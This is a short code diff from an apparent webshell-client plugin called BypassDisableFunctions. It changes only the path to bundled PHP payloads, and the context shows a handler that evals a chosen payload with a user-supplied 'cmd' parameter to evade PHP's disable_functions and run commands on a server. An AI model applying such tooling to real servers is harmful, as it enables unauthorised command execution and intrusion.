@@ -61,7 +61,7 @@ public class BypassDisableFunctions implements Plugin {
     }
 
     private void memRunButtonClick(ActionEvent actionEvent) {
-        String codeString = new String(functions.getResourceAsByteArray(this, String.format("assets/%s.php", (String) this.memPayloadComboBox.getSelectedItem())));
+        String codeString = new String(functions.getResourceAsByteArray(this, String.format("shell/php/assets/%s.php", (String) this.memPayloadComboBox.getSelectedItem())));
         ReqParameter reqParameter = new ReqParameter();
         reqParameter.add("cmd", this.commandTextField.getText());
         this.memResultTextArea.setText(eval(codeString, reqParameter));
